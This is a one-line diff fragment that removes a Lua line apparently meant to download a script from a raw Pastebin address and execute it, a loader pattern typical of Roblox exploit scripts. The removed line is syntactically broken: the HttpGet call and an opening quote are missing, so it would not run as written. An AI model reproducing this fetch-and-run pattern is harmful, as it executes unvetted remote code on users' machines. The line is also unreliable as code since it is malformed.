@@ -1,1 +1,0 @@
-loadstring(game:https://pastebin.com/raw/H678kVfz"), true))()
